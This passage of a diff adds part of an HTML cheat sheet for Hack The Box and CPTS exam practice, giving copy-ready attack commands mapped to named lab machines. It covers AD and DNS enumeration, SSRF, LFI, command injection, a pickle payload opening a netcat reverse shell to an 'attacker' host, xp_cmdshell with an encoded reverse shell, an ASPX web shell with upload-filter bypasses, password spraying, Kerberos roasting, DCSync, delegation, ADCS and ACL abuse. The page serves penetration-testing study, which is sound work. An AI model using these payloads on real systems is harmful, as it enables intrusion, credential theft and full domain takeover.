+            <div class="step"><span class="step-num">3</span><span class="step-title">Extract computers & SPNs</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">ldapsearch</span> <span class="arg">-x -H ldap://target -b 'DC=forest,DC=htb,DC=local'</span> \
+  <span class="str">"(&(objectCategory=computer)(servicePrincipalName=*))"</span> cn servicePrincipalName operatingSystem</pre>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">Find AS-REP roastable & Kerberoastable users</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">GetNPUsers.py</span> <span class="val">forest.htb/</span> <span class="arg">-no-pass -usersfile users.txt -dc-ip target</span>
+<span class="cmd">GetUserSPNs.py</span> <span class="val">forest.htb/user:pass</span> <span class="arg">-dc-ip target -request</span></pre>
+            </div>
+            <div class="step"><span class="step-num">5</span><span class="step-title">Use windapsearch for one-shot recon</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">windapsearch</span> <span class="arg">-d target -u user -p pass --da</span>     <span class="cmt"># domain admins</span>
+<span class="cmd">windapsearch</span> <span class="arg">-d target -u user -p pass --custom '(objectCategory=computer)'</span></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- DNS -->
+      <section class="section" id="dns">
+        <div class="section-header"><h2>DNS Enumeration</h2><span class="tagline">6 machines • dig, dnsenum, dnsrecon, zone transfer</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>AXFR zone transfer & DNS brute</h3><div class="desc">Many HTB AD boxes allow zone transfer or have predictable subdomains</div></div><div class="machines"><span class="mach win">snoopy</span><span class="mach win">vintage</span><span class="mach linux">trick</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Attempt zone transfer</span>
+<span class="cmd">dig</span> <span class="arg">AXFR @target</span> <span class="val">snoopy.htb</span>
+<span class="cmd">dnsenum</span> <span class="val">target</span>
+<span class="cmt"># Brute-force subdomains</span>
+<span class="cmd">gobuster dns</span> <span class="arg">-d target -w subdomains.txt -t 50</span>
+<span class="cmd">dnsrecon</span> <span class="arg">-d target -t std</span></pre>
+            <div class="note">On <b>Snoopy</b>, zone transfer leaked <code>repo.snoopy.htb</code>, <code>ns.snoopy.htb</code> etc., revealing the attack surface. On <b>Vintage</b>, DNS disclosed the ADCS server hostname.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- BLOODHOUND -->
+      <section class="section" id="bloodhound">
+        <div class="section-header"><h2>BloodHound / SharpHound</h2><span class="tagline">12 machines • the most important tool in CPTS</span></div>
+        <p class="section-intro">If you don't have BloodHound data, you're flying blind. Run it on every AD box the moment you have any valid creds (even a guest).</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Collect data with bloodhound-python</h3><div class="desc">Cross-platform collector — works from Linux without .NET</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">authority</span><span class="mach win">vintage</span><span class="mach win">administrator</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Run collection with any valid creds</span>
+              <div class="step-detail"><span class="req">Need:</span> domain\user + password OR NT hash + DC IP. <span class="next">Next:</span> import ZIP into BloodHound UI.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">bloodhound-python</span> <span class="arg">-d forest.htb.local -u svc-alfresco -p 'pass' -ns 10.10.10.161 -c All</span>
+<span class="cmt"># With NT hash (pass-the-hash collection):</span>
+<span class="cmd">bloodhound-python</span> <span class="arg">-d domain -u user -hashes :aad3b435... -ns dc_ip -c All</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Run SharpHound from a Windows shell</span>
+              <div class="step-detail"><span class="req">Need:</span> shell on domain-joined host as domain user. <span class="next">Next:</span> exfil ZIP via SMB or HTTP.</div>
+              <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">.\\SharpHound.exe</span> <span class="arg">-c All --zipfilename output.zip</span>
+<span class="val">PS&gt;</span> <span class="cmd">Invoke-BloodHound</span> <span class="arg">-CollectionMethod All -OutputDirectory C:\\Temp</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Run queries against the data</span>
+              <div class="step-detail">Built-in queries to run: <b>Find All Domain Admins</b>, <b>Shortest Path to Domain Admins</b>, <b>Find AS-REP Roastable Users</b>, <b>Kerberoastable Users</b>, <b>Find Principals with DCSync Rights</b>, <b>Certifry Path</b>.</div>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">Use cypher queries for custom paths</span>
+              <pre><button class="copy-btn">copy</button><span class="cmt"># Users with constrained delegation</span>
+MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u
+<span class="cmt"># Computers where Domain Users can RDP</span>
+MATCH p=shortestPath((u:User {name:'DOMAIN USER@DOMAIN'})-[:CanRDP*1..]->(c:Computer)) RETURN p
+<span class="cmt"># Writeable GPOs</span>
+MATCH (g:GPO) WHERE g.gpcpath IS NOT NULL RETURN g</pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- WEB EXPLOIT -->
+      <section class="section" id="web-exploit">
+        <div class="section-header"><h2>Web Exploitation</h2><span class="tagline">11 machines • SSRF, LFI, RCE, auth bypass, deserialization</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>SSRF — Server-Side Request Forgery</h3><div class="desc">Pivot web requests to internal services (cloud metadata, internal HTTP, gopher)</div></div><div class="machines"><span class="mach linux">trick</span><span class="mach win">snoopy</span><span class="mach win">media</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Identify the SSRF sink</span>
+              <div class="step-detail">Look for URL parameters (<code class="inline">?url=</code>, <code class="inline">?page=</code>, <code class="inline">?file=</code>, <code class="inline">?host=</code>). <span class="next">Next:</span> test internal targets.</div>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Enumerate internal services via SSRF</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">curl</span> <span class="str">"http://target/fetch?url=http://127.0.0.1:80"</span>
+<span class="cmd">curl</span> <span class="str">"http://target/fetch?url=http://169.254.169.254/latest/meta-data/"</span>   <span class="cmt"># cloud metadata</span>
+<span class="cmd">ffuf</span> <span class="arg">-w ports.txt -u "http://target/fetch?url=http://127.0.0.1:FUZZ/" -fs 0</span></pre>
+              <div class="note">On <b>Trick</b>, SSRF in a vhost exposed an internal admin app on port 80 — bypassing firewall. On <b>Snoopy</b>, SSRF accessed internal GitLab.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>LFI / Path Traversal</h3><div class="desc">Read arbitrary files — leads to credential discovery</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">pov</span><span class="mach win">hospital</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Classic traversal</span>
+<span class="cmd">curl</span> <span class="str">"http://target/page.php?page=../../../../etc/passwd"</span>
+<span class="cmt"># PHP filter wrapper to base64-encode source</span>
+<span class="cmd">curl</span> <span class="str">"http://target/page.php?page=php://filter/convert.base64-encode/resource=index"</span>
+<span class="cmt"># Windows files to grab</span>
+<span class="cmd">curl</span> <span class="str">"http://target/?file=../../../../Windows/System32/drivers/etc/hosts"</span>
+<span class="cmd">curl</span> <span class="str">"http://target/?file=../web.config"</span></pre>
+            <div class="warn-note"><b>What to grab on Windows:</b> <code class="inline">web.config</code>, <code class="inline">applicationHost.config</code>, <code class="inline">C:\inetpub\wwwroot\web.config</code>, <code class="inline">.htpasswd</code>, <code class="inline">C:\Users\&lt;user&gt;\AppData\Roaming\Mozilla\Firefox\Profiles\...\logins.json</code></div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Command injection & deserialization</h3><div class="desc">Many HTB web apps are vulnerable to parameter injection or insecure deserialization</div></div><div class="machines"><span class="mach linux">craft</span><span class="mach win">streamio</span><span class="mach win">whiterabbit</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># Test for injection</span>
+<span class="cmd">curl</span> <span class="str">"http://target/ping?host=127.0.0.1;id"</span>
+<span class="cmd">curl</span> <span class="str">"http://target/ping?host=\`id\`"</span>
+<span class="cmd">curl</span> <span class="str">"http://target/ping?host=\$(id)"</span>
+<span class="cmt"># Python pickle / flask debug RCE</span>
+<span class="cmd">python3</span> <span class="arg">-c</span> <span class="str">'import pickle,os,requests; class E: def __reduce__(self): return (os.system,("nc -e /bin/bash attacker 4444",))'</span></pre>
+            <div class="note">On <b>Craft</b>, a Flask API had debug mode enabled → Werkzeug console RCE. On <b>StreamIO</b>, MSSQL <code class="inline">xp_cmdshell</code> via SQLi gave RCE.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- SQLI -->
+      <section class="section" id="sqli">
+        <div class="section-header"><h2>SQL Injection</h2><span class="tagline">7 machines • sqlmap, manual UNION, MSSQL xp_cmdshell</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>MSSQL injection → xp_cmdshell → RCE</h3><div class="desc">On Windows AD boxes, MSSQL injection often leads to RCE and SYSTEM-level shells</div></div><div class="machines"><span class="mach win">streamio</span><span class="mach win">hospital</span><span class="mach win">manager</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Identify injection point</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">sqlmap</span> <span class="arg">-u "http://target/login" --data "user=*&pass=pass" --batch --level=5 --risk=3</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Check current user & SA</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">sqlmap</span> <span class="arg">-u ... --current-user --is-dba</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Enable xp_cmdshell & execute</span>
+              <pre><button class="copy-btn">copy</button>SQL&gt; <span class="cmd">EXEC</span> sp_configure 'show advanced options',1; RECONFIGURE;
+SQL&gt; <span class="cmd">EXEC</span> sp_configure 'xp_cmdshell',1; RECONFIGURE;
+SQL&gt; <span class="cmd">EXEC</span> xp_cmdshell 'powershell -enc &lt;base64-revshell&gt;';
+<span class="cmt"># Via sqlmap</span>
+<span class="cmd">sqlmap</span> <span class="arg">-u ... --os-shell</span></pre>
+              <div class="note">On <b>StreamIO</b>, the SQL injection was in a search endpoint. xp_cmdshell gave a shell as the SQL service account which was a domain user.</div>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">Manual UNION dump</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">curl</span> <span class="str">"http://target/search?q=' UNION SELECT 1,@@version,db_name(),user-- -"</span></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- FILE UPLOAD -->
+      <section class="section" id="file-upload">
+        <div class="section-header"><h2>File Upload & Web Shells</h2><span class="tagline">5 machines</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Bypass filters & upload ASPX/PHP webshells</h3><div class="desc">Common bypasses: extension tricks, magic bytes, double extensions, content-type</div></div><div class="machines"><span class="mach win">pov</span><span class="mach win">ghost</span><span class="mach linux">craft</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># ASPX cmd shell</span>
+<span class="cmd">cat</span> <span class="val">shell.aspx</span> &lt;&lt;'EOF'
+&lt;%@ Page Language="C#" %&gt;
+&lt;%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%&gt;
+EOF
+
+<span class="cmt"># Bypass tricks</span>
+<span class="val">shell.aspx</span> → shell.aspx;.jpg / shell.asp;.jpg / shell.aspx::$DATA
+<span class="val">Content-Type:</span> image/jpeg
+<span class="val">Magic bytes:</span> <span class="cmd">printf</span> <span class="str">'\xff\xd8\xff\xe0'</span> <span class="pipe">|</span> <span class="cmd">cat</span> - shell.aspx &gt; shell.jpg</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- PASSWORD SPRAY -->
+      <section class="section" id="password-spray">
+        <div class="section-header"><h2>Password Spraying</h2><span class="tagline">8 machines • crackmapexec, kerbrute, netexec</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Spray creds across the domain</h3><div class="desc">Once you have one password (or a default like 'Fall2023!'), spray it against every user</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">outdated</span><span class="mach win">authority</span><span class="mach win">administrator</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Build user list from LDAP/SMB</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">crackmapexec smb</span> <span class="val">target</span> <span class="arg">-u 'guest' -p '' --users</span> <span class="pipe">|</span> <span class="cmd">awk</span> '{print $5}' &gt; users.txt
+<span class="cmd">kerbrute</span> <span class="arg">userenum -d domain --dc target</span> users.txt</pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Spray single password against all users</span>
+              <div class="step-detail"><span class="warn">⚠ Avoid lockouts!</span> Max 3-5 attempts per account per hour. CME has built-in lockout awareness.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">crackmapexec smb</span> <span class="val">target</span> <span class="arg">-u users.txt -p 'Fall2023!' --continue-on-success</span>
+<span class="cmd">netexec smb</span> <span class="val">target</span> <span class="arg">-u users.txt -p 'Fall2023!' --continue-on-success</span>
+<span class="cmt"># Spray against WinRM (more valuable — gives shell)</span>
+<span class="cmd">netexec winrm</span> <span class="val">target</span> <span class="arg">-u users.txt -p 'Fall2023!'</span></pre>
+              <div class="note">On <b>Authority</b>, a single password <code class="inline">Welcome123!</code> worked for many users. On <b>Administrator</b>, seasonal passwords like <code class="inline">October2024!</code> sprayed successfully.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Interpret results</span>
+              <div class="step-detail"><b>[+]</b> = valid cred. <b>(Pwn3d!)</b> = local admin on that host. <span class="next">Next:</span> spray that hash everywhere.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- AS-REP -->
+      <section class="section" id="asrep">
+        <div class="section-header"><h2>AS-REP Roasting</h2><span class="tagline">6 machines • GetNPUsers, impacket, Rubeus</span></div>
+        <p class="section-intro">Targets users with <code class="inline">DONT_REQ_PREAUTH</code> flag set. Returns an encrypted blob offline-crackable to plaintext password.</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>GetNPUsers.py — the workhorse</h3><div class="desc">No creds needed if you have a user list, OR pass valid creds to enumerate roastable users</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">streamio</span><span class="mach win">administrator</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Attempt AS-REP roast without creds</span>
+              <div class="step-detail"><span class="req">Need:</span> user list (from LDAP/SMB enum) + DC IP. <span class="next">Next:</span> crack the hash with hashcat.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">GetNPUsers.py</span> <span class="val">forest.htb/</span> <span class="arg">-no-pass -usersfile users.txt -dc-ip 10.10.10.161 -format hashcat</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">With valid creds — auto-discovers roastable users</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">GetNPUsers.py</span> <span class="val">domain.local/user:pass</span> <span class="arg">-dc-ip target -request</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Crack the AS-REP hash</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">hashcat</span> <span class="arg">-m 18200</span> asrep.txt <span class="val">/usr/share/wordlists/rockyou.txt</span> <span class="arg">-r /usr/share/hashcat/rules/best64.rule</span></pre>
+              <div class="note">On <b>Forest</b>, the user <code class="inline">svc-alfresco</code> had DONT_REQ_PREAUTH → cracked to <code class="inline">s3rvice</code>. On <b>StreamIO</b>, <code class="inline">admin</code> was roastable.</div>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">From Windows: Rubeus</span>
+              <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> asreproast /format:hashcat /outfile:asrep.txt</pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- KERBEROAST -->
+      <section class="section" id="kerberoast">
+        <div class="section-header"><h2>Kerberoasting</h2><span class="tagline">9 machines • GetUserSPNs, Rubeus, hashcat 13100</span></div>
+        <p class="section-intro">Targets accounts with SPNs registered. Returns a TGS encrypted with the account's password hash. Crackable offline. <b style="color:var(--warn)">High value because:</b> works with any valid domain user, no admin needed.</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>GetUserSPNs.py</h3><div class="desc">Best from Linux. Requires one valid domain user.</div></div><div class="machines"><span class="mach win">jeeves</span><span class="mach win">snoopy</span><span class="mach win">vintage</span><span class="mach win">vulncicada</span><span class="mach win">media</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Request TGS for all SPN accounts</span>
+              <div class="step-detail"><span class="req">Need:</span> domain\user + password + DC IP. <span class="next">Next:</span> crack TGS hash offline.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">GetUserSPNs.py</span> <span class="val">domain.local/user:pass</span> <span class="arg">-dc-ip target -request -request-user 'svc_mssql'</span>
+<span class="cmt"># All SPNs at once</span>
+<span class="cmd">GetUserSPNs.py</span> <span class="val">domain.local/user:pass</span> <span class="arg">-dc-ip target -request</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Crack TGS with hashcat</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">hashcat</span> <span class="arg">-m 13100</span> tgs.txt <span class="val">rockyou.txt</span> <span class="arg">-r best64.rule</span></pre>
+              <div class="note">On <b>Jeeves</b>, the <code class="inline">Jeeves</code> account had an SPN and was crackable. On <b>Snoopy</b>, <code class="inline">svc_ipa</code> had a weak password that fell to rockyou.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">From Windows: Rubeus</span>
+              <pre><button class="copy-btn">copy</button><span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> kerberoast /outfile:tgs.txt /nowrap
+<span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> kerberoast /user:svc_mssql /outfile:tgs.txt</pre>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">AES vs RC4</span>
+              <div class="step-detail">RC4-HLM (mode 13100) is fast to crack. AES-256 (mode 19700) is much harder. Try to force RC4: set <code class="inline">/rc4opsec</code> off in Rubeus.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- DCSYNC -->
+      <section class="section" id="dcsync">
+        <div class="section-header"><h2>DCSync</h2><span class="tagline">8 machines • secretsdump.py, mimikatz, lsadump</span></div>
+        <p class="section-intro">Replicates AD secrets from the DC by impersonating a DC. Requires <b style="color:var(--warn)">DS-Replication-Get-Changes</b> right (granted to Domain Admins, Enterprise Admins, and any account with <code class="inline">Replicating Changes</code> ACL).</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>secretsdump.py — pull every hash in the domain</h3><div class="desc">End-game move. Once you have DCSync rights, the domain is fully compromised.</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">administrator</span><span class="mach win">authority</span><span class="mach win">vintage</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Run secretsdump with valid DA creds</span>
+              <div class="step-detail"><span class="req">Need:</span> domain admin (or DCSync-permitted account) creds. <span class="next">Next:</span> extract krbtgt,Administrator hashes and pass-the-hash to DC.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">secretsdump.py</span> <span class="val">domain.local/admin:pass@dc_ip</span> <span class="arg">-just-dc-ntlm</span>
+<span class="cmt"># With NT hash (PTH to DCSync)</span>
+<span class="cmd">secretsdump.py</span> <span class="arg">-hashes :aad3b435b51404eeaad3b435b51404ee:&lt;nt_hash&gt;</span> <span class="val">domain.local/admin@dc_ip</span>
+<span class="cmt"># Dump krbtgt only (for golden ticket)</span>
+<span class="cmd">secretsdump.py</span> <span class="val">domain.local/admin:pass@dc_ip</span> <span class="arg">-just-dc-user krbtgt</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">On Windows — Mimikatz</span>
+              <pre><button class="copy-btn">copy</button>mimikatz# <span class="cmd">lsadump::dcsync</span> /domain:domain.local /user:Administrator
+mimikatz# <span class="cmd">lsadump::dcsync</span> /domain:domain.local /user:krbtgt</pre>
+              <div class="note">On <b>Forest</b>, the path was AS-REP roast → user with DCSync rights → secretsdump → Administrator hash → PTH to DC.</div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- DELEGATION -->
+      <section class="section" id="delegation">
+        <div class="section-header"><h2>Delegation Attacks</h2><span class="tagline">5 machines • Unconstrained, Constrained, RBCD</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Unconstrained Delegation</h3><div class="desc">A service can impersonate any user to any service. Coerce DC$ TGT via printer bug.</div></div><div class="machines"><span class="mach win">snoopy</span><span class="mach win">vintage</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Find UD hosts in BloodHound / LDAP</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">findDelegation.py</span> <span class="val">domain.local/user:pass</span> <span class="arg">-dc-ip target</span>
+<span class="cmd">ldapsearch</span> <span class="arg">-x -H ldap://target -b 'DC=domain,DC=local'</span> <span class="str">'(userAccountControl:1.2.840.113556.1.4.803:=524288)'</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Coerce DC$ TGT via SpoolSample / PetitPotam</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">python3</span> <span class="val">PetitPotam.py</span> <span class="arg">-u user -p pass attacker_ip dc_ip</span>
+<span class="cmt"># Capture TGT via krbrelayx on attacker</span>
+<span class="cmd">krbrelayx.py</span> <span class="arg">-aesKey &lt;key&gt; --no-smb</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Use DC$ TGT to DCSync</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">export</span> KRB5CCNAME=dc.ccache
+<span class="cmd">secretsdump.py</span> <span class="arg">-k -no-pass target_dc$@dc_fqdn</span></pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Constrained Delegation (S4U2Self + S4U2Proxy)</h3><div class="desc">Service can impersonate any user to a specific SPN. Forge access to that SPN.</div></div><div class="machines"><span class="mach win">redelegate</span><span class="mach win">vulncicada</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># From Linux</span>
+<span class="cmd">getST.py</span> <span class="arg">-spn cifs/dc.domain.local -impersonate Administrator domain.local/svc_user:pass</span>
+<span class="cmd">export</span> KRB5CCNAME=Administrator.ccache
+<span class="cmd">psexec.py</span> <span class="arg">-k -no-pass domain.local/Administrator@dc.domain.local</span>
+<span class="cmt"># From Windows — Rubeus</span>
+<span class="val">PS&gt;</span> <span class="cmd">.\\Rubeus.exe</span> s4u /user:svc_user /rc4:&lt;hash&gt; /impersonateuser:Administrator /mssts:cifs/dc.domain.local /ptt</pre>
+            <div class="note">On <b>Redelegate</b>, a service account had constrained delegation to LDAP on the DC → impersonated Administrator → DCSync.</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Resource-Based Constrained Delegation (RBCD)</h3><div class="desc">If you have WriteAccountRestrictions on a computer, you can add a fake computer and abuse it</div></div><div class="machines"><span class="mach win">tombwatcher</span><span class="mach win">administrator</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Create a fake computer account (need MachineAccountQuota &gt; 0)</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">addcomputer.py</span> <span class="arg">-computer-name 'EVIL$' -computer-pass 'P@ss1234' domain.local/user:pass</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Grant EVIL$ msDS-AllowedToActOnBehalfOfOtherIdentity on target</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">rbcd.py</span> <span class="arg">-delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write domain.local/user:pass</span></pre>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">S4U to impersonate Administrator on target</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">getST.py</span> <span class="arg">-spn cifs/target.domain.local -impersonate Administrator 'domain.local/EVIL$:P@ss1234'</span>
+<span class="cmd">export</span> KRB5CCNAME=Administrator.ccache
+<span class="cmd">wmiexec.py</span> <span class="arg">-k -no-pass domain.local/Administrator@target.domain.local</span></pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- ADCS -->
+      <section class="section" id="adcs">
+        <div class="section-header"><h2>ADCS / ESC1-15</h2><span class="tagline">7 machines • certipy, certi, evil-winrm</span></div>
+        <p class="section-intro">Active Directory Certificate Services is one of the most common CPTS escalation paths. ESC1-8 are the most-tested.</p>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Enumerate vulnerable templates</h3><div class="desc">Use certipy to scan all templates for misconfigurations</div></div><div class="machines"><span class="mach win">vintage</span><span class="mach win">ghost</span><span class="mach win">whiterabbit</span><span class="mach win">administrator</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Find vulnerable CAs & templates</span>
+              <div class="step-detail"><span class="req">Need:</span> any domain user creds. <span class="next">Next:</span> identify ESC1-15 vulnerability type.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">certipy find</span> <span class="arg">-u user@domain.local -p 'pass' -dc-ip dc_ip -vulnerable -stdout</span>
+<span class="cmd">certipy find</span> <span class="arg">-u user@domain.local -p 'pass' -dc-ip dc_ip -old-bloodhound</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">ESC1 — SAN-allowed, low-priv enrollment</span>
+              <div class="step-detail">Template allows client specify subjectAltName + enrollable by low-priv users + ENROLLEE_SUPPLIES_SUBJECT flag.</div>
+              <pre><button class="copy-btn">copy</button><span class="cmd">certipy req</span> <span class="arg">-u user@domain.local -p 'pass' -ca 'CA-NAME' -template 'TEMPLATE' -upn Administrator@domain.local</span>
+<span class="cmt"># Use the cert to auth as Administrator</span>
+<span class="cmd">certipy auth</span> <span class="arg">-pfx administrator.pfx -dc-ip dc_ip</span></pre>
+              <div class="note">On <b>Vintage</b>, ESC1 with SAN=Administrator yielded a PFX → TGT → DCSync. On <b>Ghost</b>, ESC4 allowed modifying a template to enable ESC1.</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">ESC4 — modify template to ESC1</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">certipy template</span> <span class="arg">-u user@domain.local -p 'pass' -template TEMPLATE -save-old</span>
+<span class="cmd">certipy req</span> <span class="arg">-u user@domain.local -p 'pass' -ca 'CA' -template TEMPLATE -upn Administrator@domain.local</span></pre>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">ESC8 — NTLM relay to web enrollment</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">python3</span> <span class="val">PetitPotam.py</span> <span class="arg">attacker_ip dc_ip</span>
+<span class="cmd">ntlmrelayx.py</span> <span class="arg">-t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template 'DomainController'</span></pre>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ACL -->
+      <section class="section" id="acl">
+        <div class="section-header"><h2>ACL Abuse</h2><span class="tagline">10 machines • BloodHound + targeted attack paths</span></div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>GenericAll / WriteDacl / WriteOwner / GenericWrite on user</h3><div class="desc">Reset victim password or set SPN to Kerberoast them</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">snoopy</span><span class="mach win">tombwatcher</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Reset target's password</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">net rpc password "target_user" "NewPass123!" -U "domain/attacker%pass" -S target</span>
+<span class="cmd">rpcclient</span> <span class="arg">-U 'domain/attacker%pass'</span> <span class="val">target</span> -c 'setuserinfo2 target_user 23 "NewPass123!"'</span></pre>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">Set SPN to Kerberoast them</span>
+              <pre><button class="copy-btn">copy</button><span class="cmd">python3</span> <span class="val">setspn.py</span> <span class="arg">domain/attacker:pass -spn 'fake/target' -user target_user</span>
+<span class="cmd">GetUserSPNs.py</span> <span class="val">domain/attacker:pass</span> <span class="arg">-dc-ip target -request-user target_user</span></pre>
+              <div class="note">On <b>Forest</b>, the <code class="inline">Exchange Windows Permissions</code> group had WriteDacl on the domain → reset the password of a DCSync-permitted account.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>ForceChangePassword / AddMember / AddAllowedToAct</h3><div class="desc">Other common ACLs that lead to escalation</div></div><div class="machines"><span class="mach win">forest</span><span class="mach win">administrator</span></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># ForceChangePassword</span>
